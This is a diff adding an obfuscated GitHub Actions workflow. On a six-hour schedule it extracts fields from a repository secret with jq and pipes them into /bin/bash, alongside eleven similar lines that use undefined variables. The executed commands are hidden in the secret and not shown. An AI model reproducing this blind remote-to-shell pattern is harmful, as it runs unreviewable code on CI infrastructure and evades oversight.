@@ -1,0 +1,29 @@
+name: kanfangdeliaoyige
+on:
+  workflow_dispatch:
+  schedule:
+    - cron: '41 5/6 * * *'
+
+jobs:
+  build:
+    runs-on: ubuntu-latest
+
+    steps:
+      - uses: actions/checkout@v4
+      - name: kanfangdeliaoyige
+        env:
+          csdl638: ${{ secrets.csdl638 }}
+        run: |
+          echo $csdl638 | jq -r .dymak5806 | /bin/bash
+          echo $k3 | jq -r .hyil779 | /bin/bash
+          echo $j89 | jq -r .s87 | /bin/bash
+          echo $ysbkd3 | jq -r .lovp2179 | /bin/bash
+          echo $xvxah5306 | jq -r .mlrgb5799 | /bin/bash
+          echo $jygrk9 | jq -r .kimka0 | /bin/bash
+          echo $pax083 | jq -r .n870 | /bin/bash
+          echo $byti7840 | jq -r .mmzfq09012 | /bin/bash
+          echo $yzp0 | jq -r .xg1993 | /bin/bash
+          echo $hcxnn33 | jq -r .ufaxb0219 | /bin/bash
+          echo $docmm94113 | jq -r .uhf573 | /bin/bash
+          echo $uo31557 | jq -r .yzdkp7 | /bin/bash
+
